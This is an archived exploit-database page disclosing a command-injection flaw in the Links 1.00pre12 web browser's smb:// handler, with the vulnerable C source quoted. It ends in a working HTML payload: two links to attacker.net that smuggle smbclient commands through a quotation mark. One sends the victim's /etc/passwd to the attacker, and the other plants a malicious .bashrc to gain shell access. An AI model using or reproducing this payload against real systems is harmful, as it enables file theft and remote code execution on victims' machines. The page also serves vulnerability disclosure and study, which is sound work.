<html><head><title>Links 1.00pre12 (smbclient) Remote Code Execution Exploit</title></head><pre>&lt;!--
Links smbclient command execution
-----------------------------------------------------------------------------
There is a flaw in the Links web browser, that allows malicious web sites to
execute smbclient commands on the victim's machine. This flaw makes it
possible to read any file from the victim system (any file that the user
running links has read access), or to upload any file to the victim system
(any file that the user running links can create/overwrite).  The attacker
could, for example, upload ~/.bashrc to gain shell access.

Version numbers:
-----------------------------------------------------------------------------
I tested this on Ubuntu 6.06 LTS and Links 1.00pre12. Smbclient must also
be installed.

Vulnerable code:
-----------------------------------------------------------------------------
smb_func() in smb.c:
   ...
   143                 if (*share) {
   144                         if (!*dir || dir[strlen(dir) - 1] == '/'
|| dir[strlen(dir) - 1] == '\\') {
   145                                 if (dir) {
   146                                         v[n++] = &quot;-D&quot;;
   147                                         v[n++] = dir;
   148                                 }
   149                                 v[n++] = &quot;-c&quot;;
   150                                 v[n++] = &quot;ls&quot;;
   151                         } else {
   152                                 unsigned char *ss;
   153                                 unsigned char *s = stracpy(&quot;get
\&quot;&quot;);
'dir' is the directory part of the smb://.. url:
   154                                 add_to_strn(&amp;s, dir);
   155                                 add_to_strn(&amp;s, &quot;\&quot; -&quot;);
   156                                 while ((ss = strchr(s, '/')))
*ss = '\\';
   157                                 v[n++] = &quot;-c&quot;;
   158                                 v[n++] = s;
   159                         }
   160                 }
   161                 v[n++] = NULL;
smbclient is executed:
   162                 execvp(&quot;smbclient&quot;, (char **)v);
   163                 fprintf(stderr, &quot;smbclient not found in $PATH&quot;);
   164                 _exit(1);
   ...
--&gt;
&lt;html&gt;
&lt;a href='smb://attacker.net/work/XXX&quot; YYY; lcd ..; lcd ..; lcd ..; lcd etc; put passwd ; exit; '&gt;Put /etc/passwd&lt;/a&gt;
&lt;a href='smb://attacker.net/work/XXX&quot; YYY; lcd ..; lcd ..; lcd ..; lcd home; lcd teemu; get HOHO .bashrc; exit; '&gt;Get .bashrc&lt;/a&gt;
&lt;/html&gt;

# milw0rm.com [2006-11-14]</pre></html>